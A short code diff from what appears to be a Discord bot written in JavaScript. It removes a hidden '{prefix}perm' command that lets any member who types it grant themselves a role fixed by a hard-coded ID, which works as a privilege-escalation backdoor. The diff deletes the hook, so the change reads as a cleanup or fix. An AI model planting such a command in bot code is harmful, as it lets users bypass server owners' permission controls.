@@ -345,9 +345,6 @@ client.on("message", async message => {
         } else {
             message.reply('you need to be in a voice channel!');
         }
-    } else if (message.content === `${prefix}perm`) {
-        const role = message.guild.roles.cache.find(r => r.id === '658776270762541076');
-        message.member.roles.add(role);
     }
 });
 client.login(token);
